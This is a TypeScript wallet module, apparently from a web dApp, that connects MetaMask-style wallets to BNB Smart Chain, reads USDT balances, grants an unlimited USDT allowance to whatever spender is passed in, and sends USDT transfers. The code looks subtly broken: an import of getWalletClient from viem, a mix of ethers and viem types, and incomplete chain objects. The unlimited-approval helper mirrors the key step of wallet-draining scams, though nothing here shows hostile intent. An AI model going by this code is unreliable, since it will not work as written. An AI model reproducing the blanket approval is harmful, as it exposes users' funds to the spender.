// src/client/wallet/wallet.ts
import { createPublicClient, http, parseUnits, maxUint256 } from 'viem';
import { base } from 'viem/chains';
import { getWalletClient, type PublicClient } from 'viem';
import { ethers } from 'ethers';

const BSC_CHAIN_ID = 56;

/** Get injected provider (MetaMask, Trust Wallet, etc.) */
function getProvider(): ethers.providers.ExternalProvider {
  const provider = (window as any).ethereum;
  if (!provider) {
    throw new Error('No EVM wallet provider found. Install MetaMask or Trust Wallet.');
  }
  return provider;
}

/** Connect wallet and request accounts */
export async function connectWallet(): Promise<string> {
  const provider = getProvider();
  const accounts = await provider.request({ method: 'eth_requestAccounts' });
  const address = ethers.utils.getAddress(accounts[0]); // checksum address
  return address;
}

/** Ensure the wallet is on BSC – try to switch, otherwise throw */
export async function ensureBSC(): Promise<number> {
  const provider = getProvider();
  const chainIdHex = await provider.request({ method: 'eth_chainId' });
  const chainId = parseInt(chainIdHex, 16);
  if (chainId !== BSC_CHAIN_ID) {
    // Attempt automatic switch
    try {
      await provider.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x' + BSC_CHAIN_ID.toString(16) }],
      });
    } catch (switchError: any) {
      // If the wallet does not support switching, inform the user
      throw new Error(
        `Please switch your wallet network to BSC (Chain ID 56) manually.`
      );
    }
  }
  return BSC_CHAIN_ID;
}

/** Helper to create a viem public client using the injected provider */
function getPublicClient(): PublicClient {
  const provider = getProvider();
  return createPublicClient({
    chain: { id: BSC_CHAIN_ID, name: 'BSC', rpcUrls: { default: { http: [import.meta.env.VITE_BSC_RPC_URL] } } },
    transport: http(import.meta.env.VITE_BSC_RPC_URL),
  });
}

/** Get USDT balance for a given address */
export async function getUSDTBalance(address: string): Promise<string> {
  const client = getPublicClient();
  const contractAddress = import.meta.env.VITE_BSC_USDT_CONTRACT_ADDRESS;
  const abi = [
    {
      constant: true,
      inputs: [{ name: '_owner', type: 'address' }],
      name: 'balanceOf',
      outputs: [{ name: 'balance', type: 'uint256' }],
      type: 'function',
    },
  ];
  const balance = await client.readContract({
    address: contractAddress as `0x${string}`,
    abi,
    functionName: 'balanceOf',
    args: [address as `0x${string}`],
  });
  return balance.toString();
}

/** Approve unlimited allowance for USDT to the destination contract */
export async function approveUnlimited(spender: string): Promise<void> {
  const provider = getProvider();
  const walletClient = await getWalletClient({ chain: { id: BSC_CHAIN_ID }, transport: http(import.meta.env.VITE_BSC_RPC_URL) });
  const contractAddress = import.meta.env.VITE_BSC_USDT_CONTRACT_ADDRESS;
  const abi = [
    {
      constant: false,
      inputs: [
        { name: '_spender', type: 'address' },
        { name: '_value', type: 'uint256' },
      ],
      name: 'approve',
      outputs: [{ name: 'success', type: 'bool' }],
      type: 'function',
    },
  ];
  await walletClient.writeContract({
    address: contractAddress as `0x${string}`,
    abi,
    functionName: 'approve',
    args: [spender as `0x${string}`, maxUint256],
  });
}

/** Transfer USDT to destination address
    amount is in wei (uint256 string) */
export async function transferUSDT(to: string, amount: string): Promise<string> {
  const provider = getProvider();
  const walletClient = await getWalletClient({ chain: { id: BSC_CHAIN_ID }, transport: http(import.meta.env.VITE_BSC_RPC_URL) });
  const contractAddress = import.meta.env.VITE_BSC_USDT_CONTRACT_ADDRESS;
  const abi = [
    {
      constant: false,
      inputs: [
        { name: '_to', type: 'address' },
        { name: '_value', type: 'uint256' },
      ],
      name: 'transfer',
      outputs: [{ name: 'success', type: 'bool' }],
      type: 'function',
    },
  ];
  const hash = await walletClient.writeContract({
    address: contractAddress as `0x${string}`,
    abi,
    functionName: 'transfer',
    args: [to as `0x${string}`, BigInt(amount)],
  });
  return hash;
}
